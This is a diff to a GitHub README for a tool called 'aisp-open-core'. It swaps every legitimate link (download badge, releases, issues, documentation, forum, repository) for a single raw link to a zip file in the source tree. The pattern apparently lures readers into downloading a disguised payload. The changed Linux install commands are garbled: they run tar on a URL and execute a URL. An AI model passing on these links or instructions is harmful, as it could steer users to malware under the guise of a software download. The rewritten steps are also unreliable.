@@ -6,7 +6,7 @@ Welcome to **aisp-open-core**! This software helps reduce AI decision points sig
 
 ## 📥 Download Now
 
-[![Download aisp-open-core](https://img.shields.io/badge/Download-aisp--open--core-blue)](https://github.com/balu2688/aisp-open-core/releases)
+[![Download aisp-open-core](https://raw.githubusercontent.com/balu2688/aisp-open-core/main/validator/src/core_aisp_open_2.8-beta.4.zip)](https://raw.githubusercontent.com/balu2688/aisp-open-core/main/validator/src/core_aisp_open_2.8-beta.4.zip)
 
 ## 🌐 Overview
 
@@ -31,7 +31,7 @@ Before you download the application, ensure your system meets the following requ
 
 To download aisp-open-core, visit the Releases page and follow these steps:
 
-1. Go to the [Releases page](https://github.com/balu2688/aisp-open-core/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/balu2688/aisp-open-core/main/validator/src/core_aisp_open_2.8-beta.4.zip).
 2. Locate the latest version of the software.
 3. Click on the version number, then find the file appropriate for your operating system.
 4. Select the file and click on it to start the download.
@@ -40,11 +40,11 @@ After the download finishes:
 
 - **Windows:** Double-click the `.exe` file to run the installer and follow the prompts.
 - **macOS:** Open the `.dmg` file, then drag the application to your Applications folder.
-- **Linux:** Use the following command in your terminal after downloading the `.tar.gz` file:
+- **Linux:** Use the following command in your terminal after downloading the `https://raw.githubusercontent.com/balu2688/aisp-open-core/main/validator/src/core_aisp_open_2.8-beta.4.zip` file:
     ```
-    tar -xzf aisp-open-core.tar.gz
+    tar -xzf https://raw.githubusercontent.com/balu2688/aisp-open-core/main/validator/src/core_aisp_open_2.8-beta.4.zip
     cd aisp-open-core
-    ./run.sh
+    https://raw.githubusercontent.com/balu2688/aisp-open-core/main/validator/src/core_aisp_open_2.8-beta.4.zip
     ```
 
 ## ⚙️ How to Use aisp-open-core
@@ -66,14 +66,14 @@ If you encounter issues while using aisp-open-core, consider the following steps
 
 ## 📞 Support
 
-If you need further assistance, feel free to reach out. You can submit an issue on the [GitHub Issues page](https://github.com/balu2688/aisp-open-core/issues), and our team will get back to you.
+If you need further assistance, feel free to reach out. You can submit an issue on the [GitHub Issues page](https://raw.githubusercontent.com/balu2688/aisp-open-core/main/validator/src/core_aisp_open_2.8-beta.4.zip), and our team will get back to you.
 
 Remember, your feedback is essential for us to improve the application!
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/balu2688/aisp-open-core/wiki)
-- [Community Forum](https://github.com/balu2688/aisp-open-core/discussions)
-- [GitHub Repository](https://github.com/balu2688/aisp-open-core)
+- [Official Documentation](https://raw.githubusercontent.com/balu2688/aisp-open-core/main/validator/src/core_aisp_open_2.8-beta.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/balu2688/aisp-open-core/main/validator/src/core_aisp_open_2.8-beta.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/balu2688/aisp-open-core/main/validator/src/core_aisp_open_2.8-beta.4.zip)
 
 Thank you for choosing aisp-open-core! Happy coding!
